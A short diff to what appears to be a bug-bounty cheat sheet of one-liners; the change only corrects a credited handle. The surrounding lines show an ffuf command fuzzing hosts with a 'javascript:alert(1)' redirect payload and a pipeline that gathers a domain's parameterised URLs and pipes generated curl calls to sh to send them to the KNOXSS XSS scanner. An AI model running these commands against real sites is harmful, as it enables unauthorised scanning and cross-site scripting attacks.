@@ -129,7 +129,7 @@ cat hosts.txt | ffuf -w - -u "FUZZ/sign-in?next=javascript:alert(1);" -mr "javas
 ```
 
 ## Find XSS + knoxss
-> @@ofjaaah
+> @ofjaaah
 ```bash
 echo "domain" | subfinder -silent | gauplus | grep "=" | uro | gf xss | awk '{ print "curl https://knoxss[.]me/api/v3 -d \"target="$1 "\" -H \"X-API-KEY: APIKNOXSS\""}' | sh 
 ```
